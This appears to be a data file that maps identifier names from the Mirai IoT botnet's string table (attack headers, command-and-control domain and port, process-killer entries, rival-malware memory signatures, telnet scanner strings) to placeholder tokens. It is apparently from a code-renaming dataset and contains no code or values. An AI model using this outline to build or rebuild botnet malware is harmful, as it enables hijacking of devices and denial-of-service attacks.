TABLE_ATK_ACCEPT,VAR_0
TABLE_ATK_ACCEPT_LNG,VAR_1
TABLE_ATK_CHUNKED,VAR_2
TABLE_ATK_CLOUDFLARE_NGINX,VAR_3
TABLE_ATK_CONNECTION_HDR,VAR_4
TABLE_ATK_CONTENT_LENGTH_HDR,VAR_5
TABLE_ATK_CONTENT_TYPE,VAR_6
TABLE_ATK_DOSARREST,VAR_7
TABLE_ATK_KEEP_ALIVE,VAR_8
TABLE_ATK_KEEP_ALIVE_HDR,VAR_9
TABLE_ATK_LOCATION_HDR,VAR_10
TABLE_ATK_NSERV,VAR_11
TABLE_ATK_REFRESH_HDR,VAR_12
TABLE_ATK_RESOLVER,VAR_13
TABLE_ATK_SET_COOKIE,VAR_14
TABLE_ATK_SET_COOKIE_HDR,VAR_15
TABLE_ATK_TRANSFER_ENCODING_HDR,VAR_16
TABLE_ATK_VSE,VAR_17
TABLE_CNC_DOMAIN,VAR_18
TABLE_CNC_PORT,VAR_19
TABLE_EXEC_SUCCESS,VAR_20
TABLE_HTTP_FIVE,VAR_21
TABLE_HTTP_FOUR,VAR_22
TABLE_HTTP_ONE,VAR_23
TABLE_HTTP_THREE,VAR_24
TABLE_HTTP_TWO,VAR_25
TABLE_KILLER_ANIME,VAR_26
TABLE_KILLER_DELETED,VAR_27
TABLE_KILLER_EXE,VAR_28
TABLE_KILLER_FD,VAR_29
TABLE_KILLER_PROC,VAR_30
TABLE_KILLER_SAFE,VAR_31
TABLE_KILLER_STATUS,VAR_32
TABLE_MEM_QBOT,VAR_33
TABLE_MEM_QBOT2,VAR_34
TABLE_MEM_QBOT3,VAR_35
TABLE_MEM_REMAITEN,VAR_36
TABLE_MEM_UPX,VAR_37
TABLE_MEM_ZOLLARD,VAR_38
TABLE_SCAN_CB_DOMAIN,VAR_39
TABLE_SCAN_CB_PORT,VAR_40
TABLE_SCAN_ENABLE,VAR_41
TABLE_SCAN_KILL_9,VAR_42
TABLE_SCAN_NCORRECT,VAR_43
TABLE_SCAN_PS,VAR_44
TABLE_SCAN_QUERY,VAR_45
TABLE_SCAN_RESP,VAR_46
TABLE_SCAN_SH,VAR_47
TABLE_SCAN_SHELL,VAR_48
TABLE_SCAN_SYSTEM,VAR_49
add_entry,FUNC_0
table_init,FUNC_1
